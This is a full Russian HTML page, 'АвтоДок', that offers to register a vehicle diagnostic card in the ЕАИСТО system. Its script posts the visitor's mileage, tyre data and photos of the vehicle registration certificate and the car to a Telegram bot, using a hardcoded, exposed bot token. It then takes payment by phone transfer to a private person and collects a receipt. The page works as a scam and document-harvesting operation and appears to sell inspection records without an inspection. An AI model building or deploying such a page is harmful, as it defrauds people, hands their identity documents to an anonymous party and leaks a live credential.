<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оформление документов — АвтоДок</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>body { font-family: 'Inter', sans-serif; background: #f8fafc; }</style>
</head>
<body class="py-10 px-4">
    <div class="max-w-xl mx-auto bg-white rounded-[2.5rem] shadow-2xl p-8 border border-slate-100">
        <div id="full-step-1">
            <h1 class="text-2xl font-black uppercase italic mb-8 border-l-4 border-blue-600 pl-4">Данные для ЕАИСТО</h1>
            
            <form id="full-form" class="space-y-6">
                <div class="grid grid-cols-2 gap-4">
                    <div class="space-y-2">
                        <label class="text-[10px] font-black uppercase text-slate-400 italic">Пробег (км)</label>
                        <input type="number" id="mileage" required class="w-full p-4 bg-slate-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
                    </div>
                    <div class="space-y-2">
                        <label class="text-[10px] font-black uppercase text-slate-400 italic">Марка шин</label>
                        <input type="text" id="tires" required class="w-full p-4 bg-slate-50 border rounded-2xl outline-none focus:border-blue-500 font-bold">
                    </div>
                </div>

                <div class="space-y-2">
                    <label class="text-[10px] font-black uppercase text-slate-400 italic">Комментарий (если нужно)</label>
                    <textarea id="comment" class="w-full p-4 bg-slate-50 border rounded-2xl outline-none focus:border-blue-500 font-bold h-20"></textarea>
                </div>

                <div class="bg-blue-50 p-6 rounded-[2rem] space-y-4">
                    <p class="text-[10px] font-black text-blue-600 uppercase text-center italic">Фото документов и авто (4 шт)</p>
                    <div class="grid grid-cols-2 gap-2">
                        <label class="flex flex-col items-center justify-center h-24 bg-white border-2 border-dashed border-blue-200 rounded-xl cursor-pointer">
                            <span class="text-[8px] font-bold text-slate-400 uppercase">СТС Перед</span>
                            <input type="file" id="sts_1" accept="image/*" required class="hidden">
                        </label>
                        <label class="flex flex-col items-center justify-center h-24 bg-white border-2 border-dashed border-blue-200 rounded-xl cursor-pointer">
                            <span class="text-[8px] font-bold text-slate-400 uppercase">СТС Зад</span>
                            <input type="file" id="sts_2" accept="image/*" required class="hidden">
                        </label>
                        <label class="flex flex-col items-center justify-center h-24 bg-white border-2 border-dashed border-blue-200 rounded-xl cursor-pointer">
                            <span class="text-[8px] font-bold text-slate-400 uppercase">Авто Перед</span>
                            <input type="file" id="car_front" accept="image/*" required class="hidden">
                        </label>
                        <label class="flex flex-col items-center justify-center h-24 bg-white border-2 border-dashed border-blue-200 rounded-xl cursor-pointer">
                            <span class="text-[8px] font-bold text-slate-400 uppercase">Авто Зад</span>
                            <input type="file" id="car_back" accept="image/*" required class="hidden">
                        </label>
                    </div>
                </div>

                <button type="submit" id="btn-full" class="w-full bg-blue-600 text-white font-black py-5 rounded-2xl uppercase tracking-widest shadow-xl hover:bg-blue-700 transition active:scale-95">Отправить данные</button>
            </form>
        </div>

        <div id="full-step-2" class="hidden text-center">
            <h2 class="text-2xl font-black uppercase italic mb-8 text-blue-600 tracking-tighter italic">Оплата через СБП</h2>
            <div class="bg-slate-900 text-white p-8 rounded-[2rem] mb-8">
                <p class="text-2xl font-black mb-2 tracking-tighter text-blue-400">+7 917 982-77-33</p>
                <p class="text-[10px] font-bold text-slate-500 uppercase">Сбербанк • Павел Р.</p>
            </div>
            <form id="receipt-form" class="space-y-4">
                <label class="block p-8 border-2 border-dashed border-slate-200 rounded-[2rem] cursor-pointer hover:bg-slate-50 transition">
                    <span class="block text-sm font-black text-slate-600 uppercase mb-2">Прикрепить чек об оплате</span>
                    <input type="file" id="receipt_file" accept="image/*" required class="hidden">
                </label>
                <button type="submit" id="btn-receipt" class="w-full bg-slate-900 text-white font-black py-5 rounded-2xl uppercase tracking-widest hover:bg-black transition">Подтвердить оплату</button>
            </form>
        </div>

        <div id="full-step-3" class="hidden text-center py-10">
            <div class="text-5xl mb-6">🚀</div>
            <h3 class="text-2xl font-black uppercase italic mb-4">Данные получены!</h3>
            <p class="text-slate-500 font-medium mb-8 italic">Ожидайте готовности документа. Мы пришлем его в Telegram.</p>
            <a href="https://t.me/Pavel_Garant" class="inline-block bg-blue-600 text-white px-8 py-4 rounded-xl font-black uppercase text-xs tracking-[0.2em]">В поддержку</a>
        </div>
    </div>

    <script>
        const token = "8649772804:AAGjKzXa0-qQ0Ee4NcVOXDvUCSzkq-I_xXU";
        const chat_id = "7512855086";

        async function upload(id, caption) {
            const el = document.getElementById(id);
            if (el && el.files.length > 0) {
                const fd = new FormData();
                fd.append('chat_id', chat_id);
                fd.append('document', el.files[0]);
                fd.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${token}/sendDocument`, { method: 'POST', body: fd });
            }
        }

        document.getElementById('full-form').onsubmit = async (e) => {
            e.preventDefault();
            const b = document.getElementById('btn-full');
            b.disabled = true; b.innerText = "ЗАГРУЗКА...";
            const msg = `📑 ПОЛНЫЕ ДАННЫЕ\n🚗 Пробег: ${document.getElementById('mileage').value}\n🛞 Шины: ${document.getElementById('tires').value}\n📝 Коммент: ${document.getElementById('comment').value}`;
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                await upload('sts_1', 'СТС 1'); await upload('sts_2', 'СТС 2');
                await upload('car_front', 'Авто Спереди'); await upload('car_back', 'Авто Сзади');
                document.getElementById('full-step-1').classList.add('hidden');
                document.getElementById('full-step-2').classList.remove('hidden');
            } catch (err) { alert("Ошибка!"); b.disabled = false; }
        };

        document.getElementById('receipt-form').onsubmit = async (e) => {
            e.preventDefault();
            const b = document.getElementById('btn-receipt');
            b.disabled = true; b.innerText = "ОТПРАВКА...";
            try {
                await upload('receipt_file', `✅ ЧЕК ОПЛАЧЕН`);
                document.getElementById('full-step-2').classList.add('hidden');
                document.getElementById('full-step-3').classList.remove('hidden');
            } catch (err) { alert("Ошибка!"); b.disabled = false; }
        };
    </script>
</body>
</html>
